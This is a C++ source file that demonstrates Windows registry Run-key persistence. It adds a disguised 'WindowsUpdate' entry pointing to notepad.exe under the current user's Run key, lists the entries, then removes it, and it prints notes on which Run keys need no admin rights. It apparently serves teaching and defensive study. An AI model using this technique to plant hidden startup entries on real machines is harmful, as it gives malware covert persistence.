#include <windows.h>
#include <iostream>
#include <string>

// Registry Run Key Manipulation Demonstration
// This shows how attackers programmatically modify Run keys for persistence
// WARNING: This is for educational purposes only!

class RegistryRunKeyDemo {
private:
    HKEY hKey;
    std::string keyPath;
    
public:
    RegistryRunKeyDemo(const std::string& path) : keyPath(path) {
        hKey = NULL;
    }
    
    ~RegistryRunKeyDemo() {
        if (hKey) {
            RegCloseKey(hKey);
        }
    }
    
    // Open registry key
    bool OpenKey() {
        LONG result;
        if (keyPath.find("HKCU") != std::string::npos) {
            result = RegOpenKeyExA(HKEY_CURRENT_USER, 
                keyPath.substr(5).c_str(), // Remove "HKCU" prefix
                0, KEY_READ | KEY_WRITE, &hKey);
        } else if (keyPath.find("HKLM") != std::string::npos) {
            result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                keyPath.substr(5).c_str(), // Remove "HKLM" prefix
                0, KEY_READ | KEY_WRITE, &hKey);
        } else {
            std::cout << "Invalid key path format" << std::endl;
            return false;
        }
        
        if (result != ERROR_SUCCESS) {
            std::cout << "Failed to open registry key. Error: " << result << std::endl;
            return false;
        }
        
        return true;
    }
    
    // List current Run key entries
    void ListRunKeyEntries() {
        std::cout << "\n=== Current Run Key Entries ===" << std::endl;
        std::cout << "Key Path: " << keyPath << std::endl;
        
        DWORD index = 0;
        char valueName[256];
        DWORD valueNameSize;
        DWORD valueType;
        BYTE valueData[1024];
        DWORD valueDataSize;
        
        while (true) {
            valueNameSize = sizeof(valueName);
            valueDataSize = sizeof(valueData);
            
            LONG result = RegEnumValueA(hKey, index, valueName, &valueNameSize,
                NULL, &valueType, valueData, &valueDataSize);
            
            if (result == ERROR_NO_MORE_ITEMS) {
                break;
            } else if (result == ERROR_SUCCESS) {
                std::cout << "  " << valueName << " = " << valueData << std::endl;
                index++;
            } else {
                std::cout << "Error enumerating values: " << result << std::endl;
                break;
            }
        }
        
        if (index == 0) {
            std::cout << "  No entries found" << std::endl;
        }
    }
    
    // Demonstrate adding a malicious entry (SAFE - uses notepad.exe)
    void DemonstrateMaliciousEntry() {
        std::cout << "\n=== Demonstrating Malicious Entry Addition ===" << std::endl;
        std::cout << "NOTE: This uses notepad.exe for safety - real attacks use malicious executables" << std::endl;
        
        const char* maliciousName = "WindowsUpdate";
        const char* maliciousPath = "C:\\Windows\\System32\\notepad.exe";
        
        LONG result = RegSetValueExA(hKey, maliciousName, 0, REG_SZ,
            (const BYTE*)maliciousPath, strlen(maliciousPath) + 1);
        
        if (result == ERROR_SUCCESS) {
            std::cout << "✓ Malicious entry added successfully!" << std::endl;
            std::cout << "  Name: " << maliciousName << std::endl;
            std::cout << "  Path: " << maliciousPath << std::endl;
        } else {
            std::cout << "✗ Failed to add malicious entry. Error: " << result << std::endl;
        }
    }
    
    // Remove the malicious entry
    void RemoveMaliciousEntry() {
        std::cout << "\n=== Removing Malicious Entry ===" << std::endl;
        
        const char* maliciousName = "WindowsUpdate";
        LONG result = RegDeleteValueA(hKey, maliciousName);
        
        if (result == ERROR_SUCCESS) {
            std::cout << "✓ Malicious entry removed successfully!" << std::endl;
        } else if (result == ERROR_FILE_NOT_FOUND) {
            std::cout << "✓ Entry was not found (already removed)" << std::endl;
        } else {
            std::cout << "✗ Failed to remove malicious entry. Error: " << result << std::endl;
        }
    }
    
    // Show different Run key locations
    static void ShowRunKeyLocations() {
        std::cout << "\n=== Common Run Key Locations ===" << std::endl;
        std::cout << "1. HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" << std::endl;
        std::cout << "   - Runs for current user only" << std::endl;
        std::cout << "   - Requires user login" << std::endl;
        std::cout << "   - Easier to modify (no admin rights needed)" << std::endl;
        
        std::cout << "\n2. HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" << std::endl;
        std::cout << "   - Runs for all users" << std::endl;
        std::cout << "   - Requires administrator privileges" << std::endl;
        std::cout << "   - More persistent" << std::endl;
        
        std::cout << "\n3. HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" << std::endl;
        std::cout << "   - Runs once then removes itself" << std::endl;
        std::cout << "   - Good for one-time payloads" << std::endl;
        
        std::cout << "\n4. HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" << std::endl;
        std::cout << "   - System-wide RunOnce" << std::endl;
        std::cout << "   - Requires admin rights" << std::endl;
    }
};

int main() {
    std::cout << "=== Registry Run Key Attack Demonstration ===" << std::endl;
    std::cout << "WARNING: This is for educational purposes only!" << std::endl;
    std::cout << "This demonstrates how attackers use Run keys for persistence" << std::endl;
    
    // Show Run key locations
    RegistryRunKeyDemo::ShowRunKeyLocations();
    
    // Demonstrate with HKCU Run key (safer - no admin rights needed)
    std::cout << "\n" << std::string(50, '=') << std::endl;
    std::cout << "DEMONSTRATING HKCU RUN KEY MANIPULATION" << std::endl;
    std::cout << std::string(50, '=') << std::endl;
    
    RegistryRunKeyDemo demo("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    
    if (demo.OpenKey()) {
        // List current entries
        demo.ListRunKeyEntries();
        
        // Demonstrate adding malicious entry
        demo.DemonstrateMaliciousEntry();
        
        // List entries again to show the change
        demo.ListRunKeyEntries();
        
        // Remove the malicious entry (cleanup)
        demo.RemoveMaliciousEntry();
        
        // Final list to confirm removal
        demo.ListRunKeyEntries();
    }
    
    std::cout << "\n=== Demonstration Complete ===" << std::endl;
    std::cout << "This was a safe demonstration using notepad.exe" << std::endl;
    std::cout << "Real attacks would use malicious executables!" << std::endl;
    
    return 0;
}

/*
Compilation instructions:
g++ -o run_key_demo run_key_manipulation.cpp -ladvapi32

Usage:
./run_key_demo

This will demonstrate Run key manipulation without causing harm to your system.
*/
